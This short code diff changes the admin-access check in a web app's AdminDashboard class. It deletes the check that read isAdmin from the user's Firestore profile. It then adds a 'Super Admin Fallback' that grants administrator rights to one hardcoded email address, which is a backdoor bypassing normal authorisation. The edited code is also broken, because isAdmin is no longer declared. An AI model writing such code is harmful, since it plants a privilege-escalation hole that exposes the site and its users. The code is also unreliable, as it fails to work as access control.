@@ -42,7 +42,10 @@ export class AdminDashboard {
         try {
             const userDoc = await firestoreService.getUserProfile(user.uid);
             // Some profiles might have data nested under .profile
-            const isAdmin = userDoc?.isAdmin === true || userDoc?.profile?.isAdmin === true;
+            // Super Admin Fallback for immediate access
+            if (user.email === 'mahmoudsruby@gmail.com') {
+                isAdmin = true;
+            }
             
             if (!isAdmin) {
                 this._renderAccessDenied('Administrator privilege required.');
